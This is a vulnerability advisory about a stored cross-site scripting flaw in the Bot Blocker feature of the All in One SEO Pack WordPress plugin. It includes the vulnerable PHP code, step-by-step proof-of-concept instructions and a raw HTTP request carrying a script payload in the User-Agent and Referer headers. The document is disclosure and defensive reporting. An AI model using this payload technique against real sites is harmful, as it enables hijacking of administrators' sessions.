@@ -1,0 +1,75 @@
+Persistent Cross-Site Scripting in All in One SEO Pack WordPress Plugin
+David Vaartjes
+
+Abstract
+A stored Cross-Site Scripting vulnerability was found in the Bot Blocker functionality of the All in One SEO Pack WordPress Plugin (1+ million active installs). This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf.
+
+Tested versions
+This issue was successfully tested on the All in One SEO Pack WordPress Plugin version 2.3.6.1.
+
+Fix
+This issue has been fixed in version 2.3.7 of the plugin.
+
+Introduction
+All in One SEO Pack is reportedly the most downloaded plugin for WordPress. It allows users to automatically optimize their site for Search Engines. A stored Cross-Site Scripting vulnerability exists in the Bot Blocker functionality.
+
+Details
+A stored Cross-Site Scripting vulnerability exists in the Bot Blocker functionality of the All in One SEO Pack WordPress Plugin (1+ million active installs). Particularly interesting about this issue is that an anonymous user can simply store his XSS payload in the Admin dashboard by just visiting the public site with a malformed User Agent or Referrer header.
+
+The SEO Pack Bot Blocker functionality can be used to prevent certain bots from accessing/crawling the website. Bots can be detected based on User Agent and Referrer header patterns. When the User Agent contains one of the pre-configured list of bot names like "Abonti", "Bullseye" or "Exabot" the request is blocked and a 404 is returned.
+
+If the "Track Blocked Bots" setting is enabled (not by default), blocked request are logged in that HTML page without proper sanitization or output encoding, allowing XSS.
+
+The affected resource: /all-in-one-seo-pack/modules/aioseop_bad_robots.php
+
+if ( $this->option_isset( 'block_bots' ) ) {
+   if ( !$this->allow_bot() ) {
+      status_header( 503 );
+      $ip = $_SERVER['REMOTE_ADDR'];
+->      $user_agent = $_SERVER['HTTP_USER_AGENT'];
+->      $this->blocked_message( sprintf( __( "Blocked bot with IP %s -- matched user agent %s found in blocklist.",
+->      'all-in-one-seo-pack' ), $ip, $user_agent ) );
+      exit();
+   } elseif ( $this->option_isset( 'block_refer' ) && $this->is_bad_referer() ) {
+      status_header( 503 );
+      $ip = $_SERVER['REMOTE_ADDR'];
+->      $referer = $_SERVER['HTTP_REFERER'];
+->      $this->blocked_message( sprintf( __( "Blocked bot with IP %s -- matched referer %s found in blocklist.",
+->      'all-in-one-seo-pack' ), $ip, $referer ) );
+   }
+}
+
+The resulting HTML code:
+
+<span class="aioseop_option_input"><div class="aioseop_option_div" ><pre>2016-07-05 18:59:37 Blocked bot with IP 172.16.232.1 -- matched user agent Abonti </pre><script>alert(1);</script>found in blocklist.
+
+Proof of concept
+
+1/ Go to the "Bad Bot Blocker" settings page in All in one SEO menu.
+2/ Enable "Block Bad Bots using HTTP" and/or "Block Referral Spam using HTTP".
+3/ Send exploit request (with payload in referer or user-agent) to the server. Anywhere. Make sure to send your exploit request as an anonymous user. When you are logged in (have cookies), you are never seen as a bot.
+4/ If all set up ok, your request will be blocked (HTTP/1.1 503 Service Unavailable)
+5/ Open the "Bad Bot Blocker" settings page as WP admin.
+6/ Your payload will run, since it is logged in a <pre> tag.
+
+Potential use "Track Blocked Bots" setting to show/hide the <pre> block. Not needed for payload to run. Payload can be set in User-Agent or Referer field
+
+REQUEST:
+
+GET / HTTP/1.1
+Host: 172.16.232.130
+User-Agent: Abonti </pre><script>alert(1);</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.232.130/</pre><script>alert(1);</script>
+Connection: close
+Cache-Control: max-age=0
+RESPONSE:
+
+HTTP/1.1 503 Service Unavailable
+Date: Tue, 05 Jul 2016 19:31:19 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
